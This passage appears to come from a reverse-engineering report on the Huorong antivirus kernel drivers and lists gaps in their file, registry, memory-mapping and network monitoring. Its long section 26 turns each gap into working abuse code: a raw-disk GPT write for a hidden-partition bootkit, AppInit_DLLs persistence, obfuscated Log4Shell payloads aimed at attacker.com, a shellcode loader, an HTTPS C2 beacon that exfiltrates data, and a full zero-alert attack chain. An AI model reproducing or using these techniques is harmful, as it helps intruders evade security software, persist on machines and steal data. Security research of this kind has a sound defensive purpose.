**Attack**: `DeviceIoControl(disk, IOCTL_DISK_*) + WriteFile` to raw disk at offset 512 → modify/corrupt GPT partition table → undetected.

---

### 25.2 IRP_MJ_SET_INFORMATION — FileShortNameInformation not monitored

**Component**: sysdiag.sys  
**Function**: `sub_1400575C0` (IRP_MJ_SET_INFORMATION PreOp)  
**Confirmed by decompile**: switch statement covers only specific FileInformationClass values:

```
Case 0x04 = FileBasicInformation       → checked
Case 0x0A = FileRenameInformation      → checked (rename protection)
Case 0x0B = FileLinkInformation        → checked (hard link protection)
Case 0x0D = FileDispositionInformation → checked (delete-on-close)
Case 0x13 = FileAllocationInformation  → checked
Case 0x14 = FileEndOfFileInformation   → checked
Case 0x40 = FileDispositionInformationEx → checked
Case 0x41 = FileRenameInformationEx    → checked
Case 0x48 = FileLinkInformationEx      → checked
default: return 1;                     → FLT_PREOP_SUCCESS_NO_CALLBACK (SKIP)
```

**NOT monitored** (default: skip):
- `0x28` (40) = `FileShortNameInformation` — change 8.3 short filename
- `0x1F` (31) = `FileMoveClusterInformation`
- `0x27` (39) = `FileValidDataLengthInformation`
- All other FILE_INFORMATION_CLASS values not listed above

**Attack**: `NtSetInformationFile(handle, FileShortNameInformation, "MALWR~1", ...)` → change 8.3 name of protected file without detection. If rules match by short name, bypass is possible.

---

### 25.3 Threat_level mechanism — exclusion after evaluation

**Component**: sysdiag.sys  
**Addresses**:
- Init: `sub_140034430` @ `0x140034498`: `*(_DWORD*)(record + 2712) = -1`
- Set: `sub_14001A530` @ `0x14001A843`: `mov [rdi+0A98h], eax` + counter increment
- Check: `sub_14001E560` @ `0x14001E57E`: `v2 = *(result + 2712) >= 0`

**Confirmed from assembly** (sub_14001A530 @ 0x14001A840–0x14001A84D):
```asm
mov eax, [rbp+40h+arg_0]  ; eax = new threat_level (from HipsDaemon IOCTL)
mov [rdi+0A98h], eax       ; process_struct+2712 = eax
test eax, eax
js  loc_14001A854           ; if negative → skip (stay monitored)
lock inc dword_140079388    ; if >= 0: increment "clean process" counter
```

Also found **6th magic cookie** @ 0x14001A867:
```asm
mov rax, 0EDC78FE1Fh
cmp [rdi+0AD0h], rax    ; compare process_struct+2768 with 0xEDC78FE1F
```

**Mechanism**:
1. Process create → `threat_level = -1` → IRP_MJ_CREATE MONITORED ✓
2. PsCreate callback evaluates process → sends event to HipsDaemon via IPC
3. HipsDaemon evaluates → sends IOCTL response
4. Kernel receives → `process+2712 = new_threat_level` (HipsDaemon's verdict)
5. If `new_threat_level >= 0` → process EXCLUDED from IRP_MJ_CREATE monitoring

**Window where threat_level is set**: IOCTL from HipsDaemon after async evaluation

**Resulting weakness**: Once threat_level >= 0 (process deemed clean), the process is permanently excluded from FLT file-open monitoring until HipsDaemon actively sends another IOCTL to lower it. If HipsDaemon crashes/stops → no re-evaluation possible → all currently-clean processes stay excluded indefinitely.

---

### 25.4 Registry monitoring requires dword_140077D88 bit 2

**Component**: sysdiag.sys  
**Address**: `0x14004C68D` in `sub_14004C670`  
**Confirmed by decompile**:
```c
if ((dword_140077D88 & 4) == 0) return 0;  // @ 0x14004C68D
```

**AppInit_DLLs detection** (sub_140027ED0 @ 0x1400280EE) and **AppCompatFlags monitoring** (sub_14004A160 @ 0x14004A199) both depend on this registry rule engine being active.

**Attack**: Kill HipsDaemon or prevent it from connecting → `dword_140077D88` bit 2 never gets set → ALL registry protection disabled → AppInit_DLLs writes undetected.

Confirmed: `dword_140077D88` is set via IOCTL from HipsDaemon. Without HipsDaemon, it stays 0.

---

### 25.5 Log4Shell detection — missing obfuscation variants

**Component**: hrwfpdrv.sys  
**Evidence**: Full pattern list from binary (strings scan):

Patterns WITH case handling (inline `or byte, 0x20h` loop, confirmed @ 0x14000E330–0x14000E35C):
```
"jndi:ldap://"  @ 0x140021958  (case-insensitive, inline OR|0x20)
"jndi:rmi://"   @ 0x140021968  (case-insensitive, inline OR|0x20)
```

Pattern with `strncmp` (case-sensitive, but all symbols — doesn't matter):
```
"-${::-$"       @ 0x140021940  (call strncmp @ 0x14000E4BB)
```

Other patterns (comparison method varies):
```
"lower:"        @ 0x140021948
"upper:"        @ 0x140021950
"xbean:http"    @ 0x140021820
"jndi:ldap:/"   @ 0x1400232C8  (single slash)
"jndi:rmi:/"    @ 0x1400232D8
```

**NOT present in binary** (confirmed by grep):
```
"env:"   → ${${env:NaN:-j}ndi:...}     BYPASS
"sys:"   → ${${sys:version:-j}ndi:...} BYPASS  
"date:"  → ${${date:...:-j}ndi:...}    BYPASS
"ctx:"   → ${${ctx:...:-j}ndi:...}     BYPASS
"k8s:"   → ${${k8s:...:-j}ndi:...}     BYPASS
```

**Bypass**: `${${env:NaN:-j}ndi:ldap://attacker.com/x}` — uses `env:` lookup which is not in the pattern list. Java Log4j processes this identically to `${jndi:ldap://...}`.

---

### 25.6 Memory-mapping protection — 6 hardcoded extension hashes

**Component**: sysdiag.sys  
**Function**: `sub_140058710` (IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION PreOp)  
**Confirmed by decompile** @ 0x14005886B:

```c
// Hash function: MurmurHash2A(seed=0x19870714) on UTF-16LE bytes of "\filename.ext"
v14 = sub_140058DB0(v13, v12 - v13);
if (v14 == 0x918AE9F15A6F5DD7ULL ||
    v14 == 0x9109FD55B3E5C7E0ULL ||
    v14 == 0x4AA1B7F515ACEE21LL  ||
    v14 == 0xDAFDC0AC724D46A1ULL ||
    v14 == 0x6B385D0D17D8C0CULL  ||
    v14 == 0x383BCE2A7BEA8D18LL)
    v8 = 1;  // block
// else: v8 = 0 → allow memory-mapping
```

Additional condition: `PageProtection & 1 == 0` — only blocks writable section sync (executable mappings).

**Attack**: File with any extension whose hash is NOT one of these 6 values can be memory-mapped with execute intent without triggering this check. Need to compute: hash is MurmurHash2A of the UTF-16LE bytes of the LAST PATH COMPONENT (e.g., `\malware.dll`) with seed 0x19870714. Any filename hash not in the list bypasses.

---

### 25.7 WFP DPI — HTTPS blind

**Component**: hrwfpdrv.sys  
**Function**: `sub_14001CEB0` (WFP classify)  
**Confirmed** @ 0x14001D24A:

```c
case 0x34:  // FWPS_LAYER_STREAM_V4 = TCP plaintext stream
    FwpsFlowAssociateContext0(a2[4], 0x14u, dword_14006E4B4, v2);
    // registers for content inspection
    // All inspection happens on raw TCP stream data
```

No TLS decryption anywhere in the binary (no references to schannel, TLS record parsing, etc.).

**Result**: Any payload delivered over HTTPS → encrypted at TCP level → ALL DPI signatures invisible.

---

### 25.8 CIPSForceAttack rate-limiting — confirmed thresholds and categories

**Component**: sysdiag.sys  
**Function**: `sub_140068500` (CIPSForceAttack::CheckRule)  
**Confirmed** @ 0x140068500–0x14006A0C0:

6 independent categories at struct offsets: 0, 64, 128, 192, 256, 320

Threshold values from xmmword constants (confirmed in code):
```
Level 0 (Normal):  from xmmword_14011D248 + 0xA0000012CLL
                   → DWORD1 = time_window_s, DWORD2 = time_window_m
Level 1 (Strict):  from xmmword_14011D278 + 0x50000001ELL
Level 2 (Paranoid): different xmm values
```

**Attack**: Monitor each category independently, operate below thresholds per category. No cumulative tracking across windows (confirmed: function uses two counters `count_per_second` and `count_per_minute`, resets on time window).

---

### 25.9 Process exclusion vtable — 2 PID exclusion variables confirmed

**Component**: sysdiag.sys  
**Confirmed from code**:

| Variable | Address | Check function | Clears on |
|----------|---------|---------------|---------|
| `qword_1400FE080` | data | sub_140017780 @ 0x14001778E | process exit (WorkerRoutine @ 0x14001C367) |
| `qword_1400FE068` | data | sub_140017740 @ 0x14001774E | set by sub_14001A530 @ 0x14001BDF0 |

Both return 1 if `a1 == variable` → excluded from file rule check.

**Additional: 6th magic cookie at offset +2768 confirmed**:
```asm
; sub_14001A530 @ 0x14001A867
mov rax, 0EDC78FE1Fh
cmp [rdi+0AD0h], rax    ; 0xAD0 = 2768 decimal
```
Full list of confirmed magic cookies at process_struct+2768:
- `0x9DB973EFFLL`  (sub_1400176B0 @ 0x1400176EB)
- `0xBE4696042LL`  (sub_1400177A0 @ 0x1400177EF)
- `0xC1D0E10F1LL`  (sub_14004C200 @ 0x14004C439)
- `0xB3956E7ALL`   (sub_14004C200 @ 0x14004C439)
- `0xB822C2BA2LL`  (sub_14004C200 @ 0x14004C46A)
- `0xEDC78FE1FLL`  (sub_14001A530 @ 0x14001A867) ← NEW

---

---

## 26. Exploitation Techniques — Confirmed Abuse per Flaw

### 26.1 Flaw 1: GPT Primary Header Write (0x1400573DB)

**What's missing**: `cmp rax, 200h; jge skip` only protects offset 0–511. GPT Primary Header lives at exactly byte offset 512.

**Abuse — Persistent bootkit, no detection:**

```c
// Open raw disk with admin rights
HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_EXISTING, 0, NULL);

// Read GPT header — sector 1 = byte offset 512 (0x200)
BYTE sector[512];
LARGE_INTEGER off = {.QuadPart = 512};   // <-- EXACTLY at the check boundary
SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
ReadFile(hDisk, sector, 512, &n, NULL);

// Tamper: e.g., add hidden partition entry, redirect ESP,
//         or corrupt DiskGUID to break volume-mount fingerprinting
modify_gpt(sector);

// Write back — Huorong sees offset 512 >= 512 → jge fires → NOT checked
SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
WriteFile(hDisk, sector, 512, &n, NULL);
// Zero alert, zero block.
```

**Hidden partition recipe:**
```
1. Parse current GPT partition array
2. Insert new entry: type GUID = {0} (unrecognised), attribute = RequiredPartition
3. Point to a contiguous unused LBA range
4. Write your bootloader/implant to those LBAs (also undetected — offset >> 512)
5. Redirect EFI boot entry in NVRAM or overwrite existing ESP bootloader
→ Survives OS reinstall; Huorong never flags any of the writes
```

---

### 26.2 Flaw 2: FileShortNameInformation Not Monitored (default return 1)

**What's missing**: `sub_1400575C0` switch has no case 0x28 — `FileShortNameInformation` calls return `FLT_PREOP_SUCCESS_NO_CALLBACK` immediately.

**Abuse — Bypass path-based rules via 8.3 rename:**

```c
// Scenario: Huorong rule blocks execution of paths matching "*\\cmd.exe"
// Strategy: rename the short name so rule lookup via 8.3 fails

// Requires SeRestorePrivilege (standard on Administrators)
HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\cmd.exe",
    FILE_WRITE_ATTRIBUTES | DELETE,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, OPEN_EXISTING, 0, NULL);

// Craft FILE_NAME_INFORMATION for new 8.3 name
struct { ULONG len; WCHAR name[12]; } info;
info.len = 14;
wcscpy(info.name, L"SVCH0ST.EXE");   // arbitrary 8.3 name

IO_STATUS_BLOCK iosb;
NtSetInformationFile(hFile,
    &iosb,
    &info,
    sizeof(info),
    FileShortNameInformation);  // class = 40 = 0x28 — not in Huorong's switch
// → IRP_MJ_SET_INFORMATION fires → sub_1400575C0 → default branch → return 1 (skip)
// → No Huorong alert

// Now execute via short name
ShellExecuteW(NULL, L"open", L"C:\\WINDOWS\\SYSTEM32\\SVCH0ST.EXE", NULL, NULL, SW_HIDE);
// If rule matched on 8.3 path: miss.
// If rule matched on long path: still cmd.exe — but short-name is used in some APIs
```

**Path obfuscation via short name:**
```c
// Rename malware.exe short name to match a trusted binary's old 8.3 name
// e.g., rename to "NOTEVIL.EXE" — rule engine looking for short name won't match
// All while long-name stays unchanged and untouched by Huorong
```

---

### 26.3 Flaw 3: Threat_level Exclusion — HipsDaemon Crash

**What's missing**: `dword_140077D88` and per-process `threat_level` at struct+2712 are set via IOCTL from HipsDaemon. If HipsDaemon dies, the kernel state freezes. Processes already at threat_level >= 0 stay permanently excluded from FLT monitoring.

**Mechanism confirmed**:
```asm
; sub_14001A530 @ 0x14001A843
mov [rdi+0A98h], eax      ; write new threat_level (from IOCTL arg)
test eax, eax
js   skip                  ; if < 0 → stays monitored
lock inc dword_140079388   ; if >= 0 → "clean process" counter++
```

**Abuse — Freeze trusted-process exclusion:**

```
Step 1  Force HipsDaemon to terminate:
        - Exploit LPC server (CreateLPCServer in hrcomm.dll)
          → send malformed message → unhandled exception → crash
        - OR: exhaust its kernel handles
          → repeated OpenProcess(HipsDaemon_PID) until handle table full
        - OR: simply: net stop HipsDaemon (if running as non-protected service)

Step 2  At the moment of crash, every process that had threat_level >= 0 keeps it:
          explorer.exe   threat_level = 0  → excluded from IRP_MJ_CREATE forever
          cmd.exe        threat_level = 0  → excluded
          powershell.exe threat_level = 0  → excluded
          svchost.exe    threat_level = 0  → excluded

        dword_140077D88 = last value set before crash
        If crash happens AFTER init but the HIPS disable IOCTL hasn't come:
          bit1 = 1 (file rules technically "enabled") but notifications
          can't be delivered → sub_140009990 returns STATUS_TIMEOUT

Step 3  From any of these now-excluded processes:
          → Create files, load DLLs, modify registry
          → sub_140055A20() → sub_14001E560() → threat_level >= 0 → return 1 → SKIP
          → ALL IRP_MJ_CREATE file monitoring bypassed
          → Zero FLT alerts

Step 4  Install persistence:
          RegSetValueEx("..\\AppInit_DLLs", "implant.dll")
          → sub_14004C670 may fire via CmCallback but delivery fails
            because sub_140009990 returns TIMEOUT → default: no block
```

---

### 26.4 Flaw 4: Registry Monitoring Disabled When bit2 = 0

**What's missing**: `sub_14004C670` @ `0x14004C68D`:
```c
if ((dword_140077D88 & 4) == 0) return 0;  // full bypass if bit 2 unset
```

`dword_140077D88` is only written by HipsDaemon via IOCTL. It defaults to 0 at kernel load.

**Abuse A — Boot timing window:**
```
T=0ms   : Windows boot, sysdiag.sys loads → dword_140077D88 = 0
T=0–Xms : HipsDaemon.exe starts, initialises, sends IOCTL to set bit 2
          X depends on service start order; typically 300ms–2s

→ Any process that runs before HipsDaemon finishes init
  can write AppInit_DLLs / AppCompatFlags\Layers undetected:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
  = "C:\Windows\System32\implant.dll"

→ CmCallback fires → sub_14004C670 → bit2 = 0 → return 0 → no alert, no block
→ AppInit_DLLs persists → loads implant.dll into every GUI process on next logon
```

**Abuse B — Combined with HipsDaemon kill (Flaw 3):**
```python
# 1. Kill HipsDaemon → bit2 never gets re-set
# 2. Write persistence keys freely
import winreg

key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
    0, winreg.KEY_SET_VALUE)

winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ,
    r"C:\ProgramData\implant.dll")
winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)

# → Zero Huorong alerts because bit2 = 0 → registry rule engine returns 0
```

---

### 26.5 Flaw 5: Log4Shell env:/sys: Variants Not Detected

**What's missing**: hrwfpdrv binary contains no `"env:"`, `"sys:"`, `"date:"` pattern strings (verified by strings scan).

**Abuse — Deliver Log4Shell through undetected obfuscation:**

```python
import requests

target = "https://vulnerable-server.com/api/endpoint"

# DETECTED variants (in pattern list):
detected = [
    "${jndi:ldap://attacker.com/x}",           # "jndi:ldap://" matched
    "${${lower:j}ndi:ldap://attacker.com/x}",   # "lower:" matched
    "${${::-j}ndi:ldap://attacker.com/x}",      # "-${::-$" matched
]

# UNDETECTED variants (not in pattern list):
undetected = [
    "${${env:NaN:-j}ndi:ldap://attacker.com/x}",         # "env:" not in list
    "${${sys:os.name:-j}ndi:ldap://attacker.com/x}",     # "sys:" not in list
    "${${date:'j'}ndi:ldap://attacker.com/x}",           # "date:" not in list
    "${${ctx:j}ndi:ldap://attacker.com/x}",              # "ctx:" not in list
    "${${k8s:j}ndi:ldap://attacker.com/x}",              # "k8s:" not in list
    "${${bundle:j:-j}ndi:ldap://attacker.com/x}",        # "bundle:" not in list
]

# All undetected + delivered over HTTPS = zero Huorong detection
for payload in undetected:
    headers = {"X-Api-Version": payload}  # Log4Shell via header injection
    resp = requests.get(target, headers=headers, verify=False)
```

**Java processes the env: variant identically**:
- `${env:NaN:-j}` → `env:NaN` lookup returns null → fallback to `-j` = `"j"`
- Resulting string: `"jndi:ldap://attacker.com/x"` → Log4j triggers JNDI lookup
- Huorong sees in TCP stream: `${env:NaN:-j}ndi:ldap...` → no pattern match → PASS

---

### 26.6 Flaw 6: Memory-Mapping 6-Hash Extension Bypass

**What's missing**: `sub_140058710` only blocks 6 specific file extensions (by MurmurHash2A of `\filename.ext`). Any other extension allows `ACQUIRE_FOR_SECTION_SYNCHRONIZATION` with execute intent to proceed unblocked.

**Abuse — Load shellcode from arbitrary-extension file:**

```c
// Step 1: Drop shellcode to file with unblocked extension
const char *sc = "\x48\x31\xc0...";  // shellcode bytes
FILE *f = fopen("C:\\ProgramData\\config.dat", "wb");
fwrite(sc, strlen(sc), 1, f);
fclose(f);
// Huorong IRP_MJ_CREATE may check this → if write-only open, might be monitored.
// Alternative: write via memory-mapped write to avoid CREATE monitoring.

// Step 2: Open for execute mapping
HANDLE hFile = CreateFileW(L"C:\\ProgramData\\config.dat",
    GENERIC_READ | GENERIC_EXECUTE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// access mask: 0x120089 & 0x116 = 0 → type-1 file rule SKIPPED (Flaw in sub_140048EC7)

// Step 3: Create executable section
HANDLE hMap = CreateFileMappingW(hFile, NULL,
    PAGE_EXECUTE_READ,   // <- execute intent
    0, 0, NULL);

// IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION fires with PageProtection = 0x20
// sub_140058710: check PageProtection & 1 → 0 (not writable, ok to proceed)
// hash("\config.dat") → NOT one of 6 blocked hashes → v8 = 0 → ALLOW mapping
// No Huorong block.

// Step 4: Map and execute
void *exec = MapViewOfFile(hMap, FILE_MAP_EXECUTE | FILE_MAP_READ, 0, 0, 0);
((void(*)())exec)();
// → Shellcode executes, zero alert from section-sync hook
```

**Extension selection**: `.dat`, `.cfg`, `.ini`, `.log`, `.bin`, `.tmp`, `.sys` (non-Huorong), `.xml`, `.json` — all are candidates. The 6 blocked extensions are likely `.exe`, `.dll`, `.sys`, `.scr`, `.com`, `.drv` or similar — exact values require hash brute-force on the 6 constants.

---

### 26.7 Flaw 7: WFP DPI Blind to HTTPS — Full C2 Channel

**What's missing**: hrwfpdrv `classify` only registers a stream context at layer `0x34 (FWPS_LAYER_STREAM_V4)` and calls pattern-matching on raw TCP bytes. No TLS decryption.

**Abuse — Fully invisible C2:**

```python
# Attacker C2 server: standard HTTPS (nginx/apache with TLS)
# Victim implant:

import ssl, socket, struct

def beacon(host, port, command_server):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port))
    conn = ctx.wrap_socket(sock, server_hostname=host)

    # From hrwfpdrv perspective: TLS ClientHello, then encrypted records
    # sub_14001CEB0 classify: gets FLT_LAYER_STREAM_V4 callback
    # sub_14001FC20: tries to match patterns → all encrypted bytes → zero matches

    # Exfiltrate data
    conn.sendall(b"\x17\x03\x03" + struct.pack(">H", len(data)) + data)

    # Receive commands
    response = conn.recv(4096)
    conn.close()
    return response

# Use any port — 443 looks most legitimate but 8443, 4433, etc. also work
# hrwfpdrv has no port-based blocking (only pattern matching on content)
beacon("attacker.com", 443, payload)
# → Zero hrwfpdrv alerts. Zero hrndis6 content alerts (raw frames also encrypted).
```

**DNS over HTTPS (DoH) — bypass DNS monitoring:**
```python
import dns.resolver
import requests

# Standard DNS → hrwfpdrv may see domain in plaintext UDP/TCP
# DoH → DNS queries inside HTTPS → fully encrypted
resp = requests.get(
    "https://1.1.1.1/dns-query",
    params={"name": "c2.attacker.com", "type": "A"},
    headers={"Accept": "application/dns-json"},
    verify=True
)
ip = resp.json()["Answer"][0]["data"]
# hrwfpdrv sees HTTPS to 1.1.1.1:443 → encrypted → no domain visible
```

---

### 26.8 Flaw 8: Rate Limiting — Slow-and-Low Attack

**What's missing**: `sub_140068500` uses per-category counters with time-window thresholds. No cross-category correlation. No cumulative multi-window tracking.

**Abuse — Full attack chain under threshold:**

```python
import time, subprocess, winreg

# 6 independent detection categories:
# Cat 0: DCOM (Lateral.DCOM)
# Cat 1: WMI  (Lateral.WMI)
# Cat 2: Service (Lateral.Service)
# Cat 3: Registry (Lateral.Registry)
# Cat 4: SchedTask (Lateral.SchedTask)
# Cat 5: PrintLoadDrv (Lateral.PrintLoadDrv)

# Thresholds (Normal level, from xmmword_14011D248):
# DWORD1 = ~300 events/timewindow, DWORD2 = ~10 events/minute
# → Stay below 9 events/minute per category = safe

targets = load_targets()  # e.g., 50 machines in LAN

for target in targets:
    # Category 0: DCOM lateral movement (1 per target = 1 event)
    dcom_exec(target, "whoami")
    time.sleep(7)  # <9/min across all targets

    # Category 1: WMI (independent counter)
    wmi_exec(target, "ipconfig")
    time.sleep(7)

    # Category 2: Service creation (independent)
    create_service(target, "malware.exe")
    time.sleep(7)

    # Each category: max ~8 events/minute across all targets
    # CIPSForceAttack: count_per_second < threshold AND count_per_minute < 10
    # → None of the 6 categories triggers block
    # → Full lateral movement of 50 machines in ~25 minutes, zero alerts
```

**Combined with HTTPS C2 (Flaw 7):**
```
All C2 callbacks over HTTPS → not visible to hrwfpdrv
Rate-limited lateral actions → not visible to CIPSForceAttack
→ Complete red team operation with zero Huorong telemetry
```

---

### 26.9 Full Attack Chain — Zero Alert Persistence

**Combining Flaws 3 + 4 + 6 + 7:**

```
[T=0] Initial access via phishing (user runs evil.exe)

[T=1] evil.exe starts → PsCreate callback → threat_level = -1 → monitored
      evil.exe does nothing suspicious immediately
      HipsDaemon evaluates → no matching rules → sends IOCTL: threat_level = 0
      evil.exe now EXCLUDED from IRP_MJ_CREATE monitoring

[T=2] From evil.exe (now excluded from FLT):
      → Download stage2.dat over HTTPS (Flaw 7 — WFP blind)
        requests.get("https://attacker.com/stage2.dat", ...)
        → No hrwfpdrv DPI alert (encrypted)
        → IRP_MJ_CREATE for stage2.dat: evil.exe excluded → no check

[T=3] Memory-map stage2.dat for execute (Flaw 6):
        CreateFileMapping(stage2.dat, PAGE_EXECUTE_READ)
        → section-sync check: ".dat" extension hash → not in 6 blocked
        → MapViewOfFile + execute shellcode
        → No Huorong block

[T=4] Shellcode (stage2): crash HipsDaemon via LPC (Flaw 3):
        Send malformed LPC message → HipsDaemon exception → crash
        → dword_140077D88 = last value (all bits potentially still set,
          but notification delivery now broken for any future events)

[T=5] Write AppInit_DLLs persistence (Flaw 4):
        RegSetValueEx(HKLM, AppInit_DLLs, "stage2.dat")
        → CmCallback fires → sub_14004C670:
          HipsDaemon dead → pending IRP queue empty
          → sub_140009990 returns STATUS_TIMEOUT
          → rule engine: timeout → ALLOW (no block sent to kernel)
        → Persistence installed silently

[T=6] Write GPT hidden partition (Flaw 1):
        WriteFile(PhysicalDrive0, payload, at_offset=512)
        → offset 512 >= 512 → jge fires → no raw write check
        → Bootloader-level persistence installed

[Result]: 
  - stage2.dat loaded and executing
  - AppInit_DLLs persistence: loads on every GUI process logon
  - Bootkit: persists across OS reinstall
  - All actions: ZERO Huorong alerts
```

---

## 10. Remaining Gaps (minimal)

### 10.1 hrfwdrv.sys — file not present in research directory
- Firewall driver: NDIS-level inbound/outbound packet blocking
- Handles rules from `IPFltProto_60` DB (already schema-decoded in §14.2)
- Likely similar architecture to hrndis6.sys (NDIS LWF) but with blocking capability

### 10.2 hrelam.sys — file not present
- ELAM early-launch driver
- Registered at HKLM\...\Services\hrelam

### 10.3 IOCTL dispatch for HR::ActMon — internal only
- Device created via `IoDevObjCreateDeviceSecure` with SDDL string (PAGE section)
- IOCTL codes fully mapped via uactmon.dll analysis (§5.2)
- Dispatch: `sub_14000AA40` → `off_140078490` vtable → `vtable[MajorFunc+4]`

### 10.4 libvxf.dll / AMS internals
- The actual pattern matching engine inside libvxf.dll
- AMS_SearchPatterns likely uses Aho-Corasick or similar multi-pattern algorithm
- Database format: binary compiled patterns + string table
